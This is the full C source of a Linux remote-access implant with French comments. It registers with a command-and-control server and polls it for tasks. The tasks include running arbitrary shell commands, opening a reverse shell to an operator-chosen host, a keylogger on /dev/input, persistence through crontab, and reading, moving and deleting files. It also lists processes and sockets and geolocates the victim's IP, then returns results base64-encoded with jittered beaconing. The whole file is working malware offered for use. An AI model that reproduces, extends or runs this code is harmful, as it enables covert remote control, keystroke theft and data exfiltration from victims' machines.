#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h> // Pour PATH_MAX
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>
#include <linux/input.h> // Pour le keylogger
#include <pthread.h>     // Pour les threads

// Variables globales pour le keylogger
static int keylogger_fd = -1;         // Descripteur de fichier pour /dev/input
static FILE *keylogger_file = NULL;   // Fichier de sortie
static pthread_t keylogger_thread;    // Thread pour capturer les frappes
static int keylogger_running = 0;     // Indicateur d’état

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
    size_t realsize = size * nmemb;
    strncat(buffer, (char *)contents, realsize);
    return realsize;
}

// Fonction pour nettoyer une chaîne (remplacer les retours à la ligne par des espaces)
void clean_string(char *str) {
    for (size_t i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\n' || str[i] == '\r') {
            str[i] = ' ';
        }
    }
}

// Fonction pour encoder une chaîne en base64
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char *base64_encode(const char *input) {
    size_t input_len = strlen(input);
    size_t output_len = 4 * ((input_len + 2) / 3);
    char *encoded = malloc(output_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_b = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_c = i < input_len ? (unsigned char)input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded[j++] = base64_table[triple & 0x3F];
    }

    if (input_len % 3 == 1) {
        encoded[j - 2] = '=';
        encoded[j - 1] = '=';
    } else if (input_len % 3 == 2) {
        encoded[j - 1] = '=';
    }

    encoded[j] = '\0';
    return encoded;
}

// Fonction pour exécuter une commande et capturer la sortie
char *execute_command(const char *cmd) {
    char buffer[8192] = {0};
    size_t buffer_len = 0;
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        return strdup("Erreur : impossible d'exécuter la commande");
    }

    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, fp)) {
        buffer_len = strlen(buffer);
    }
    pclose(fp);

    clean_string(buffer);
    return strdup(buffer);
}

// Fonction pour lire le contenu d'un fichier
char *read_file(const char *filepath) {
    FILE *fp = fopen(filepath, "r");
    if (!fp) {
        return strdup("Erreur : impossible d'ouvrir le fichier");
    }

    char buffer[8192] = {0};
    size_t buffer_len = 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        strncat(buffer, line, sizeof(buffer) - buffer_len - 1);
        buffer_len = strlen(buffer);
    }
    fclose(fp);

    clean_string(buffer);
    return strdup(buffer);
}

// Fonction pour lister les processus (simulé avec `ps`)
char *list_processes() {
    return execute_command("ps aux");
}

// Fonction pour lister les sockets ouverts
char *list_sockets() {
    char buffer[8192] = {0};
    size_t offset = 0;

    // Lister les sockets TCP
    FILE *tcp_file = fopen("/proc/net/tcp", "r");
    if (tcp_file) {
        char line[256];
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n");
        fgets(line, sizeof(line), tcp_file); // Ignorer l'en-tête
        while (fgets(line, sizeof(line), tcp_file)) {
            unsigned int local_ip, remote_ip, port_local, port_remote, state;
            sscanf(line, "%*d: %x:%x %x:%x %x", &local_ip, &port_local, &remote_ip, &port_remote, &state);

            struct in_addr local_addr = {.s_addr = local_ip};
            struct in_addr remote_addr = {.s_addr = remote_ip};
            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &local_addr, local_str, sizeof(local_str));
            inet_ntop(AF_INET, &remote_addr, remote_str, sizeof(remote_str));

            const char *state_str;
            switch (state) {
                case 1: state_str = "ESTABLISHED"; break;
                case 10: state_str = "LISTEN"; break;
                default: state_str = "UNKNOWN"; break;
            }

            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                               "tcp    0      0 %s:%u         %s:%u         %s\n",
                               local_str, port_local, remote_str, port_remote, state_str);
        }
        fclose(tcp_file);
    } else {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, "Erreur : impossible d'ouvrir /proc/net/tcp\n");
    }

    // Lister les sockets UDP
    FILE *udp_file = fopen("/proc/net/udp", "r");
    if (udp_file) {
        char line[256];
        fgets(line, sizeof(line), udp_file); // Ignorer l'en-tête
        while (fgets(line, sizeof(line), udp_file)) {
            unsigned int local_ip, remote_ip, port_local, port_remote;
            sscanf(line, "%*d: %x:%x %x:%x", &local_ip, &port_local, &remote_ip, &port_remote);

            struct in_addr local_addr = {.s_addr = local_ip};
            struct in_addr remote_addr = {.s_addr = remote_ip};
            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &local_addr, local_str, sizeof(local_str));
            inet_ntop(AF_INET, &remote_addr, remote_str, sizeof(remote_str));

            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                               "udp    0      0 %s:%u         %s:%u\n",
                               local_str, port_local, remote_str, port_remote);
        }
        fclose(udp_file);
    } else {
        offset += snprintf(buffer + offset, sizeof(buffer) - offset, "Erreur : impossible d'ouvrir /proc/net/udp\n");
    }

    clean_string(buffer);
    return strdup(buffer);
}

// Fonction pour récupérer la localisation réelle
char *get_location() {
    CURL *curl = curl_easy_init();
    if (!curl) {
        return strdup("Erreur : échec de l'initialisation de curl");
    }

    char buffer[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/json");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        return strdup("Erreur : échec de la récupération de la localisation");
    }

    struct json_object *parsed_json = json_tokener_parse(buffer);
    if (!parsed_json) {
        return strdup("Erreur : impossible de parser la réponse JSON");
    }

    struct json_object *loc_field, *city_field, *country_field;
    char result[256] = {0};
    const char *loc = "unknown", *city = "unknown", *country = "unknown";

    if (json_object_object_get_ex(parsed_json, "loc", &loc_field)) {
        loc = json_object_get_string(loc_field);
    }
    if (json_object_object_get_ex(parsed_json, "city", &city_field)) {
        city = json_object_get_string(city_field);
    }
    if (json_object_object_get_ex(parsed_json, "country", &country_field)) {
        country = json_object_get_string(country_field);
    }

    snprintf(result, sizeof(result), "Latitude/Longitude: %s (%s, %s)", loc, city, country);
    json_object_put(parsed_json);
    return strdup(result);
}

// Fonction pour envoyer un reverse shell
char *send_reverse_shell(const char *lhost, int lport) {
    if (!lhost || lport <= 0 || lport > 65535) {
        return strdup("Erreur : LHOST ou LPORT invalide");
    }

    pid_t pid = fork();
    if (pid == 0) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            exit(1);
        }

        struct sockaddr_in server_addr = {0};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(lport);
        if (inet_pton(AF_INET, lhost, &server_addr.sin_addr) <= 0) {
            close(sockfd);
            exit(1);
        }

        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            dup2(sockfd, 0); // stdin
            dup2(sockfd, 1); // stdout
            dup2(sockfd, 2); // stderr
            execl("/bin/sh", "sh", NULL);
        }
        close(sockfd);
        exit(0);
    }
    return strdup("Reverse shell envoyé");
}

// Fonction exécutée par le thread pour capturer les frappes
void *keylogger_loop(void *arg) {
    struct input_event ev;
    while (keylogger_running) {
        ssize_t n = read(keylogger_fd, &ev, sizeof(ev));
        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) { // Touche pressée
            if (keylogger_file) {
                fprintf(keylogger_file, "Key: %d\n", ev.code);
                fflush(keylogger_file);
            }
        }
    }
    return NULL;
}

// Fonction pour activer/désactiver le keylogger
char *toggle_keylogger(const char *state, const char *filepath) {
    if (!state) {
        return strdup("Erreur : état du keylogger non spécifié");
    }

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
        if (keylogger_running) {
            return strdup("Keylogger déjà activé");
        }

        // Ouvre le périphérique d’entrée (ajustez "event0" selon votre système)
        keylogger_fd = open("/dev/input/event0", O_RDONLY);
        if (keylogger_fd < 0) {
            return strdup("Erreur : impossible d'ouvrir /dev/input (permissions root requises ?)");
        }

        // Ouvre le fichier de sortie si spécifié
        if (filepath && strcmp(filepath, "null") != 0) {
            keylogger_file = fopen(filepath, "a");
            if (!keylogger_file) {
                close(keylogger_fd);
                return strdup("Erreur : impossible d'ouvrir le fichier de sortie");
            }
        }

        // Démarre le thread
        keylogger_running = 1;
        if (pthread_create(&keylogger_thread, NULL, keylogger_loop, NULL) != 0) {
            keylogger_running = 0;
            if (keylogger_file) fclose(keylogger_file);
            close(keylogger_fd);
            return strdup("Erreur : échec de la création du thread");
        }

        char msg[256];
        if (filepath && strcmp(filepath, "null") != 0) {
            snprintf(msg, sizeof(msg), "Keylogger activé, écriture dans %s", filepath);
            return strdup(msg);
        }
        return strdup("Keylogger activé");
    }
    else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
        if (!keylogger_running) {
            return strdup("Keylogger déjà désactivé");
        }

        // Arrête le thread
        keylogger_running = 0;
        pthread_join(keylogger_thread, NULL);

        // Ferme les ressources
        if (keylogger_file) {
            fclose(keylogger_file);
            keylogger_file = NULL;
        }
        if (keylogger_fd >= 0) {
            close(keylogger_fd);
            keylogger_fd = -1;
        }

        return strdup("Keylogger désactivé");
    }

    return strdup("Erreur : état du keylogger invalide (doit être 'true'/'false' ou 'on'/'off')");
}

// Fonction pour obtenir le chemin absolu de l'exécutable actuel
char *get_executable_path() {
    char path[PATH_MAX];
    ssize_t count = readlink("/proc/self/exe", path, PATH_MAX);
    if (count == -1) {
        return strdup("Erreur : impossible de récupérer le chemin de l'exécutable");
    }
    path[count] = '\0'; // Terminer la chaîne
    return strdup(path);
}

// Fonction pour gérer la persistance
char *toggle_persistence(const char *state) {
    if (!state) {
        return strdup("Erreur : état de persistance non spécifié");
    }

    char *exec_path = get_executable_path();
    if (strncmp(exec_path, "Erreur", 6) == 0) {
        return exec_path;
    }

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
        char command[PATH_MAX + 50];
        snprintf(command, sizeof(command), "echo '* * * * * %s' | crontab -", exec_path);
        system(command);
        char result[PATH_MAX + 100];
        snprintf(result, sizeof(result), "Persistance activée (ajoutée au crontab avec %s)", exec_path);
        free(exec_path);
        return strdup(result);
    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
        system("crontab -r");
        free(exec_path);
        return strdup("Persistance désactivée (crontab supprimé)");
    }

    free(exec_path);
    return strdup("Erreur : état de persistance invalide (doit être 'true'/'false' ou 'on'/'off')");
}

// Fonction pour déplacer/renommer un fichier
char *move_file(const char *src, const char *dst) {
    if (rename(src, dst) == 0) {
        return strdup("Fichier déplacé avec succès");
    }
    return strdup("Erreur : impossible de déplacer le fichier");
}

// Fonction pour supprimer un fichier
char *remove_file(const char *filepath) {
    if (remove(filepath) == 0) {
        return strdup("Fichier supprimé avec succès");
    }
    return strdup("Erreur : impossible de supprimer le fichier");
}

// Fonction pour effectuer une requête DECLARE
int perform_declare(CURL *curl, char *response, char *implant_uid, size_t implant_uid_size, char *username, char *hostname, char *os) {
    char json[8192];
    snprintf(json, sizeof(json),
             "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}",
             username, hostname, os);
    printf("JSON DECLARE envoyé : %s\n", json);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur DECLARE : %s\n", curl_easy_strerror(res));
        return 0;
    }

    printf("Réponse DECLARE : %s\n", response);

    struct json_object *parsed_json, *ok_field, *uid_field;
    parsed_json = json_tokener_parse(response);
    if (!parsed_json) {
        fprintf(stderr, "Erreur : impossible de parser la réponse JSON DECLARE\n");
        return 0;
    }

    if (json_object_object_get_ex(parsed_json, "OK", &ok_field) &&
        json_object_object_get_ex(ok_field, "UID", &uid_field)) {
        const char *uid = json_object_get_string(uid_field);
        if (uid) {
            memset(implant_uid, 0, implant_uid_size);
            strncpy(implant_uid, uid, implant_uid_size - 1);
            implant_uid[implant_uid_size - 1] = '\0';
            printf("Nouvel implant-uid reçu et copié : %s (longueur : %zu)\n", implant_uid, strlen(implant_uid));
            json_object_put(parsed_json);
            return 1;
        }
    }

    fprintf(stderr, "Erreur : échec de l'extraction de l'implant-uid dans DECLARE\n");
    json_object_put(parsed_json);
    return 0;
}

int main() {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    char implant_uid[32] = {0};
    int sleep_time = 5;
    int jitter = 2;
    int not_found_count = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur : échec de l'initialisation de curl\n");
        return 1;
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    char username[32], hostname[64], os[32] = "LINUX";
    const char *user = getenv("USER");
    if (user) {
        strncpy(username, user, sizeof(username) - 1);
        username[sizeof(username) - 1] = '\0';
    } else {
        strncpy(username, "unknown", sizeof(username) - 1);
    }
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strncpy(hostname, "unknown", sizeof(hostname) - 1);
    }

    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
        fprintf(stderr, "Échec du DECLARE initial, arrêt du programme\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 1;
    }

    while (1) {
        memset(response, 0, sizeof(response));

        char json[8192];
        snprintf(json, sizeof(json), "{\"FETCH\":\"%s\"}", implant_uid);
        printf("JSON FETCH envoyé : %s (implant_uid longueur : %zu)\n", json, strlen(implant_uid));

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Erreur FETCH : %s\n", curl_easy_strerror(res));
            sleep(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        printf("Réponse FETCH : %s\n", response);

        struct json_object *parsed_json = json_tokener_parse(response);
        if (!parsed_json) {
            fprintf(stderr, "Erreur : impossible de parser la réponse JSON FETCH\n");
            sleep(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        struct json_object *error_field, *task_uid_field, *action_field;
        char *task_uid = NULL;
        char *result = NULL;

        if (json_object_object_get_ex(parsed_json, "error", &error_field)) {
            const char *error_msg = json_object_get_string(error_field);
            printf("Erreur FETCH : %s\n", error_msg);
            if (strcmp(error_msg, "NotFound") == 0) {
                not_found_count++;
                if (not_found_count >= 50) {
                    printf("Trop d'erreurs NotFound, réessai de DECLARE...\n");
                    memset(implant_uid, 0, sizeof(implant_uid));
                    memset(response, 0, sizeof(response));
                    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
                        fprintf(stderr, "Échec du DECLARE, arrêt du programme\n");
                        json_object_put(parsed_json);
                        curl_slist_free_all(headers);
                        curl_easy_cleanup(curl);
                        curl_global_cleanup();
                        return 1;
                    }
                    not_found_count = 0;
                }
            }
            json_object_put(parsed_json);
            sleep(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        not_found_count = 0;

        if (json_object_object_get_ex(parsed_json, "task_uid", &task_uid_field) &&
            json_object_object_get_ex(parsed_json, "action", &action_field)) {
            task_uid = strdup(json_object_get_string(task_uid_field));

            struct json_object *execve_field, *sleep_field, *locate_field, *revshell_field;
            struct json_object *keylog_field, *persist_field, *cat_field, *mv_field;
            struct json_object *rm_field, *ps_field, *netstat_field;

            if (json_object_object_get_ex(action_field, "EXECVE", &execve_field)) {
                struct json_object *cmd_field, *args_field;
                const char *cmd = NULL, *args = NULL;
                if (json_object_object_get_ex(execve_field, "cmd", &cmd_field)) {
                    cmd = json_object_get_string(cmd_field);
                }
                if (json_object_object_get_ex(execve_field, "args", &args_field)) {
                    args = json_object_get_string(args_field);
                }

                char full_cmd[256];
                if (args && strcmp(args, "null") != 0) {
                    snprintf(full_cmd, sizeof(full_cmd), "%s %s", cmd, args);
                } else {
                    snprintf(full_cmd, sizeof(full_cmd), "%s", cmd);
                }
                result = execute_command(full_cmd);
                printf("Résultat EXECVE : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "SLEEP", &sleep_field)) {
                struct json_object *seconds_field, *jitter_field;
                if (json_object_object_get_ex(sleep_field, "seconds", &seconds_field)) {
                    sleep_time = json_object_get_int(seconds_field);
                }
                if (json_object_object_get_ex(sleep_field, "jitter", &jitter_field)) {
                    jitter = json_object_get_int(jitter_field);
                } else {
                    jitter = 0;
                }
                result = strdup("Temps de sommeil mis à jour");
                printf("Nouveau temps de sommeil : %d secondes, jitter : %d secondes\n", sleep_time, jitter);
            }
            else if (json_object_object_get_ex(action_field, "LOCATE", &locate_field)) {
                result = get_location();
                printf("Résultat LOCATE : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "REVSHELL", &revshell_field)) {
                struct json_object *lhost_field, *lport_field;
                const char *lhost = "127.0.0.1";
                int lport = 0;
                if (json_object_object_get_ex(revshell_field, "host", &lhost_field)) {
                    lhost = json_object_get_string(lhost_field);
                }
                if (json_object_object_get_ex(revshell_field, "port", &lport_field)) {
                    lport = json_object_get_int(lport_field);
                }
                if (lport == 0) {
                    result = strdup("Erreur : LPORT non spécifié ou invalide");
                } else {
                    result = send_reverse_shell(lhost, lport);
                }
                printf("Résultat REVSHELL : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "KEYLOG", &keylog_field)) {
                struct json_object *state_field, *filepath_field;
                const char *state = NULL, *filepath = NULL;
                if (json_object_object_get_ex(keylog_field, "status", &state_field)) {
                    state = json_object_get_string(state_field);
                }
                if (json_object_object_get_ex(keylog_field, "path", &filepath_field)) {
                    filepath = json_object_get_string(filepath_field);
                }
                result = toggle_keylogger(state, filepath);
                printf("Résultat KEYLOG : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "PERSIST", &persist_field)) {
                struct json_object *state_field;
                const char *state = NULL;
                if (json_object_object_get_ex(persist_field, "status", &state_field)) {
                    state = json_object_get_string(state_field);
                }
                result = toggle_persistence(state);
                printf("Résultat PERSIST : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "CAT", &cat_field)) {
                struct json_object *filepath_field;
                const char *filepath = NULL;
                if (json_object_object_get_ex(cat_field, "filepath", &filepath_field)) {
                    filepath = json_object_get_string(filepath_field);
                }
                if (!filepath || strcmp(filepath, "null") == 0) {
                    result = strdup("Erreur : filepath non spécifié");
                } else {
                    result = read_file(filepath);
                }
                printf("Résultat CAT : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "MV", &mv_field)) {
                struct json_object *src_field, *dst_field;
                const char *src = NULL, *dst = NULL;
                if (json_object_object_get_ex(mv_field, "src", &src_field)) {
                    src = json_object_get_string(src_field);
                }
                if (json_object_object_get_ex(mv_field, "dst", &dst_field)) {
                    dst = json_object_get_string(dst_field);
                }
                if (!src || !dst || strcmp(src, "null") == 0 || strcmp(dst, "null") == 0) {
                    result = strdup("Erreur : src ou dst non spécifié");
                } else {
                    result = move_file(src, dst);
                }
                printf("Résultat MV : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "RM", &rm_field)) {
                struct json_object *filepath_field;
                const char *filepath = NULL;
                if (json_object_object_get_ex(rm_field, "filepath", &filepath_field)) {
                    filepath = json_object_get_string(filepath_field);
                }
                if (!filepath || strcmp(filepath, "null") == 0) {
                    result = strdup("Erreur : filepath non spécifié");
                } else {
                    result = remove_file(filepath);
                }
                printf("Résultat RM : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
                result = list_processes();
                printf("Résultat PS : %s\n", result);
            }
            else if (json_object_object_get_ex(action_field, "NETSTAT", &netstat_field)) {
                result = list_sockets();
                printf("Résultat NETSTAT : %s\n", result);
            }
            else {
                printf("Tâche non reconnue\n");
                result = strdup("Erreur : tâche non reconnue");
            }

            if (result) {
                char *encoded_result = base64_encode(result);
                if (!encoded_result) {
                    fprintf(stderr, "Erreur : échec de l'encodage base64\n");
                    free(result);
                    free(task_uid);
                    json_object_put(parsed_json);
                    sleep(sleep_time + (rand() % (jitter + 1)));
                    continue;
                }

                memset(json, 0, sizeof(json));
                snprintf(json, sizeof(json),
                         "{\"RESULT\":{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"%s\"}}",
                         implant_uid, task_uid, encoded_result);
                free(encoded_result);

                memset(response, 0, sizeof(response));
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);

                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    fprintf(stderr, "Erreur RESULT : %s\n", curl_easy_strerror(res));
                } else {
                    printf("Réponse RESULT : %s\n", response);
                }

                free(result);
                free(task_uid);
            }
        } else {
            printf("Aucune tâche disponible\n");
        }

        json_object_put(parsed_json);
        sleep(sleep_time + (rand() % (jitter + 1)));
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}